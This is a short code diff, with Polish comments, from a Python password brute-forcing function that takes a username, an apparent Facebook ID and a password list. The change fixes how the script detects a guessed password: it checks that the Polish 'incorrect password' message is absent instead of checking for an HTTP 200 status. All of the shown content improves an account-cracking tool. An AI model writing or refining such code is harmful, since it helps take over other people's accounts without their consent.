@@ -21,7 +21,7 @@ def brute_force(username, fb_id, passwords):
         })
 
         # Sprawdź odpowiedź
-        if response.status_code == 200:
+        if "Nieprawidłowe hasło" not in response.text:
             # Hasło zostało znalezione
             print('Znaleziono hasło:', password)
             return
